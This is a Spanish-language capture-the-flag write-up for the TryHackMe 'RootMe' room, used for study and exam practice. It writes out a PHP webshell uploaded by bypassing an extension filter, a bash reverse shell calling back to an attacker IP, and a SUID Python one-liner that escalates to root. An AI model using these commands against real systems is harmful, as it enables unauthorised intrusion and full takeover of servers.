---
title: 'RootMe - TryHackMe'
description: 'Writeup de RootMe en TryHackMe. Explotación de una subida de archivos sin restricciones suficientes para cargar una webshell PHP y escalada de privilegios mediante el binario SUID de Python.'
pubDate: 2026-02-04
platform: 'tryhackme'
category: 'rooms'
difficulty: 'easy'
os: 'linux'
language: es
tags: ['file-upload', 'webshell', 'bypass', 'suid', 'python', 'gobuster']
retired: false
heroImage: '/images/writeups/tryhackme/rootme.jpg'
attackVectors: ['web']
techniques: ['T1190', 'T1059.006', 'T1548.001']
vulnerabilities: ['unrestricted-file-upload', 'suid-abuse']
certifications: ['eJPT', 'CEH']
skillLevel: 'beginner'
estimatedTime: '45 minutos'
rating: 4.5
---

# RootMe - TryHackMe Writeup

**Dificultad**: Easy
**OS**: Linux
**Plataforma**: TryHackMe

## Introducción

RootMe es una sala introductoria de TryHackMe que cubre dos conceptos esenciales en pentesting web: **bypass de subida de archivos** para obtener ejecución de código remoto y **abuso de binarios SUID** para escalar a root. Perfecta para practicar tras completar las salas de introducción.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sV -sC -p- 10.10.x.x -oN rootme.txt
```

**Puertos abiertos:**

```
22/tcp open  ssh  OpenSSH 7.6p1
80/tcp open  http Apache httpd 2.4.29
```

### Escaneo de directorios

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
```

**Directorios encontrados:**

```
/css            (Status: 301)
/js             (Status: 301)
/uploads        (Status: 301)   <-- aquí van los ficheros subidos
/panel          (Status: 301)   <-- panel de subida
```

## Enumeración Web

Accedemos a `http://10.10.x.x/panel/` y encontramos un formulario de subida de archivos.

**Restricciones detectadas:** el servidor rechaza archivos `.php` directamente.

## Explotación

### Bypass de filtro de extensión

Probamos extensiones PHP alternativas que Apache puede interpretar:

- `.php3` — rechazado
- `.php4` — rechazado
- `.php5` — **aceptado** ✓
- `.phtml` — aceptado

Creamos la webshell con extensión `.php5`:

```bash
cat > shell.php5 << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Subimos `shell.php5` desde el panel. Verificamos el acceso:

```bash
curl "http://10.10.x.x/uploads/shell.php5?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse shell

```bash
# Listener
nc -lvnp 4444

# Payload (URL-encoded)
curl "http://10.10.x.x/uploads/shell.php5?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.x.x.x/4444+0>%261'"
```

```
www-data@rootme:/var/www/html/uploads$
```

### User flag

```bash
find / -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```

## Escalada de Privilegios

### Búsqueda de binarios SUID

```bash
find / -perm /4000 -type f 2>/dev/null
```

**Resultado importante:**

```
/usr/bin/python
```

Python con SUID es una escalada trivial. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid):

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```

### Root flag

```bash
cat /root/root.txt
```

## Conclusión

RootMe cubre dos técnicas muy comunes en exámenes como el eJPT y el OSCP:

1. **Bypass de filtros por extensión** — Si el servidor filtra `.php`, probar variantes como `.php5`, `.phtml`, `.phar`
2. **SUID en intérpretes** — Un intérprete con SUID (Python, Perl, Ruby) siempre supone escalada a root via GTFOBins

| Paso           | Técnica                |
| -------------- | ---------------------- |
| Reconocimiento | nmap + gobuster        |
| Acceso inicial | Subida de archivo PHP5 |
| Escalada       | SUID python            |

## Recursos

- [GTFOBins - Python SUID](https://gtfobins.github.io/gtfobins/python/#suid)
- [HackTricks - File Upload Bypass](https://book.hacktricks.xyz/pentesting-web/file-upload)
